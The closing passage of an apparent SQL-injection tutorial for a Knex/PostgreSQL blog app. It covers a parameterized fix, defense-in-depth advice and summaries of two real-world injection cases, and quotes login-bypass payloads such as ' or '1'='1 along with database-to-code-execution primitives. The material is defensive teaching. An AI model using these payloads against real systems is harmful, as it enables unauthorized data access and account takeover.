{"posts":[]}
real    0m3.012s
```

Re-running the Step 1 sqlmap command against the patched app is a good regression check.

`plainto_tsquery` is the right function to feed user text to — it
[parses free text and ignores operators](https://www.postgresql.org/docs/current/textsearch-controls.html#TEXTSEARCH-PARSING-QUERIES)
— so once the value is bound, there's nothing left to inject.

Even better, keep the privacy filter in the builder like the feed does and only drop to raw SQL for
the full-text expression, with bindings:

```js
knex('posts as p')
  .join('users as u', 'p.user_id', 'u.id')
  .where((b) => { b.where('p.is_private', false); if (uid) b.orWhere('p.user_id', uid); })
  .whereRaw(`to_tsvector('english', p.title || ' ' || COALESCE(p.body, '')) @@ plainto_tsquery('english', ?)`, [query])
  .orderByRaw(`ts_rank(to_tsvector('english', p.title || ' ' || COALESCE(p.body, '')), plainto_tsquery('english', ?)) DESC`, [query])
  .limit(50)
  .select('p.*', 'u.username as author_username');
```

**Defense-in-depth (do these too — never rely on a single control):**

1. **Least-privilege DB role.** Don't connect the app as the `POSTGRES_USER` superuser. Create an
   app role with only `SELECT/INSERT/UPDATE/DELETE` on `users`/`posts` — that alone kills
   `pg_read_file`, `COPY … PROGRAM` and friends.
2. **Row-Level Security for privacy.** Enforce "public or mine" in the database with
   [PostgreSQL RLS](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) on `posts`
   (setting the current user id per request) so a single buggy query can't leak private rows.
3. **Ban template literals in raw SQL** with a lint/SAST rule — e.g. a Semgrep rule matching
   `knex.raw(\`...${$X}...\`)` / `whereRaw(\`...${$X}...\`)` in CI.
4. **Constrain the input:** cap `q` length and reject control characters — cheap, and it shrinks
   what any future bug can do.
5. **Don't leak DB errors** to clients (already done here — responses are a generic 500), and
   **alert on SQL syntax errors** in logs; the failed `OR 1=1 --` attempts are a loud signal.

## **Real world examples 🌍**

- **[Pre-Auth SQL Injection to RCE: Fortinet FortiWeb Fabric Connector (CVE-2025-25257) — watchTowr Labs, July 2025](https://labs.watchtowr.com/pre-auth-sql-injection-to-rce-fortinet-fortiweb-fabric-connector-cve-2025-25257/)**
  — The researchers diffed two FortiWeb versions and found that the fix replaced a string-formatted
  query, `snprintf(s, 0x400u, "select id from fabric_user.user_table where token='%s'", a1)`, with a
  prepared statement. They traced the input to the `Authorization: Bearer` header on an endpoint that
  needs no login. Like Blogger's double insertion, the obvious payloads didn't work at first: the
  token can't contain spaces and is capped at 128 characters. They used inline comments instead of
  spaces and kept payloads short. Then, because the database ran with high privileges, they used
  `INTO OUTFILE` to write a Python `.pth` file and get remote code execution. It's a code-review-style
  walkthrough of the same root cause, from spotting the format string to full compromise.
- **[Bypassing airport security via SQL injection — Ian Carroll & Sam Curry](https://ian.sh/tsa)**
  — While looking at the systems that let airline crew skip TSA screening (KCM) and access cockpits
  (CASS), they found FlyCASS, a vendor web app for small airlines. A single `'` in the login username
  returned a MySQL error. They confirmed the injection with sqlmap, logged in as an airline admin with
  `' or '1'='1`, and added a made-up crew member who was instantly approved for both programs. It's a
  different query (login instead of search), but the same root cause: user input pasted into a SQL
  string. It shows how a single injectable query can break the one rule the whole system exists to
  enforce.

## **More resources** 📚

- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Query Parameterization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html)
- [Knex — Raw queries & bindings](https://knexjs.org/guide/raw.html)
- [node-postgres — Parameterized queries](https://node-postgres.com/features/queries#parameterized-query)
- [PostgreSQL — Row Security Policies](https://www.postgresql.org/docs/current/ddl-rowsecurity.html)
- [sqlmap](https://sqlmap.org/) and its [usage wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [PortSwigger Web Security Academy — SQL injection](https://portswigger.net/web-security/sql-injection)
  and [Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)

**Takeaway:** Using a query builder doesn't make an app injection-proof — it only protects the queries
that actually go through it. Hunt for the escape hatches (`raw`, `whereRaw`, `orderByRaw`) and check
that **every** value in them is a binding, not just the one that looks like it was done right. And
when an injection "only errors", don't call it safe: here the payload landed twice and the obvious
test returned a 500, yet sqlmap turned it into a full database read without a single line of
hand-written exploit.
